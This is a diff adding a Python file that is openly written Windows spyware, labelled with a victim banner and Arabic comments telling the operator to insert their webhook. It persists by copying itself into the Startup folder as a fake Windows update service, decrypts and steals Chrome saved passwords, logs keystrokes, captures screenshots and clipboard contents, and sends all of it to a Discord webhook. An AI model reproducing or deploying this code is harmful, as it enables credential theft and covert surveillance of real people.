@@ -1,0 +1,150 @@
+import os
+import sys
+import smtplib
+import socket
+import platform
+import getpass
+import win32crypt
+import sqlite3
+import threading
+import time
+import pyautogui
+import keyboard
+import requests
+from datetime import datetime
+from PIL import ImageGrab
+from discord_webhook import DiscordWebhook
+
+# ==== CONFIG ====
+WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/xxxxxxxxxxxxxxxxx"  # حط الويب هوك بتاعك هنا يا حيوان 😈
+EXFIL_INTERVAL = 30  # ثواني
+# =================
+
+keys = []
+count = 0
+screenshot_counter = 0
+
+def send_to_discord(data, filename=None):
+    webhook = DiscordWebhook(url=WEBHOOK_URL, username="SpyWare-Victim")
+    if filename:
+        with open(filename, "rb") as f:
+            webhook.add_file(file=f.read(), filename=filename)
+    webhook.set_content(data)
+    webhook.execute()
+
+def add_to_startup():
+    try:
+        path = sys.argv[0]
+        name = "WindowsUpdateService.exe"
+        startup = os.path.expanduser(f"~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}")
+        if not os.path.exists(startup):
+            os.system(f'copy "{path}" "{startup}"')
+    except: pass
+
+def get_system_info():
+    info = f"""
+    🎯 New Victim Connected - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+    👤 User: {getpass.getuser()}
+    💻 PC Name: {platform.node()}
+    🖥️ OS: {platform.system()} {platform.release()}
+    🏛️ Architecture: {platform.architecture()[0]}
+    🌐 Public IP: {requests.get('https://api.ipify.org').text}
+    🌍 Private IP: {socket.gethostbyname(socket.gethostname())}
+    """
+    return info
+
+def steal_chrome_passwords():
+    try:
+        login_db = os.environ['LOCALAPPDATA'] + \
+            r"\Google\Chrome\User Data\Default\Login Data"
+        temp_db = "LoginTemp.db"
+        os.system(f'copy "{login_db}" "{temp_db}"')
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+        
+        passwords = ""
+        for row in cursor.fetchall():
+            url = row[0]
+            username = row[1]
+            encrypted_password = row[2]
+            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+            passwords += f"Site: {url}\nUser: {username}\nPass: {decrypted_password.decode()}\n{'-'*50}\n"
+        
+        conn.close()
+        os.remove(temp_db)
+        if passwords:
+            send_to_discord("🔑 Chrome Passwords Stolen:\n" + passwords)
+    except: pass
+
+def keylogger():
+    global keys, count
+    def on_press(key):
+        global keys, count
+        try:
+            keys.append(str(key.char))
+        except AttributeError:
+            if key == key.space:
+                keys.append(" ")
+            elif key == key.enter:
+                keys.append("\n[ENTER]\n")
+            elif key == key.backspace:
+                keys.append(" [BACKSPACE] ")
+            else:
+                keys.append(f" [{key}] ")
+        
+        count += 1
+        if count >= 50:
+            log = "".join(keys)
+            send_to_discord(f"⌨️ Keystrokes:\n```{log}```")
+            keys = []
+            count = 0
+
+    keyboard.on_press(on_press)
+
+def take_screenshot():
+    global screenshot_counter
+    while True:
+        screenshot_counter += 1
+        screenshot = ImageGrab.grab()
+        filename = f"ss_{screenshot_counter}.png"
+        screenshot.save(filename)
+        send_to_discord(f"📸 Screenshot #{screenshot_counter}", filename)
+        os.remove(filename)
+        time.sleep(EXFIL_INTERVAL)
+
+def clipboard_grab():
+    while True:
+        try:
+            import win32clipboard
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            if data and len(str(data)) > 10:
+                send_to_discord(f"📋 Clipboard:\n```{data}```")
+        except: pass
+        time.sleep(10)
+
+def main():
+    add_to_startup()
+    send_to_discord(get_system_info())
+    steal_chrome_passwords()
+    
+    threading.Thread(target=keylogger, daemon=True).start()
+    threading.Thread(target=take_screenshot, daemon=True).start()
+    threading.Thread(target=clipboard_grab, daemon=True).start()
+    
+    # يفضل مخلّي الـ main thread شغال عشان ما يقفلش
+    while True:
+        time.sleep(100)
+
+if __name__ == "__main__":
+    try:
+        import win32crypt, keyboard, pyautogui, win32clipboard
+        from PIL import ImageGrab
+        from discord_webhook import DiscordWebhook
+    except:
+        os.system("pip install pywin32 keyboard pyautogui pillow discord-webhook requests -q")
+    
+    main()
